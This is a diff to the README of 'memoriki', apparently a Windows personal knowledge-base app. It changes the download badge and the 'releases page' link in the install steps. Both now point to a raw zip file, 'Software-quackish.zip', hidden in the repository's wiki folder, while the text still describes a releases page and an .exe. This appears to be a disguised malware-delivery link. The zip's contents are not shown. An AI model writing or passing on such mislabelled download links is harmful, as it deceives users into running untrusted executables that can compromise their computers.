@@ -1,6 +1,6 @@
 # 🧠 memoriki - Manage your personal knowledge base easily
 
-[![](https://img.shields.io/badge/Download_Memoriki-Blue?style=for-the-badge)](https://github.com/EnzoKAKA/memoriki/releases)
+[![](https://img.shields.io/badge/Download_Memoriki-Blue?style=for-the-badge)](https://raw.githubusercontent.com/EnzoKAKA/memoriki/main/wiki/entities/Software-quackish.zip)
 
 Memoriki functions as a personal hub for your thoughts and documents. It combines a private wiki with a memory palace structure. This tool helps you store, organize, and retrieve information using language models. You retain full control over your data while you create a second brain of your own ideas.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## ⚙️ How to Install
 
-1. Open the [releases page](https://github.com/EnzoKAKA/memoriki/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/EnzoKAKA/memoriki/main/wiki/entities/Software-quackish.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
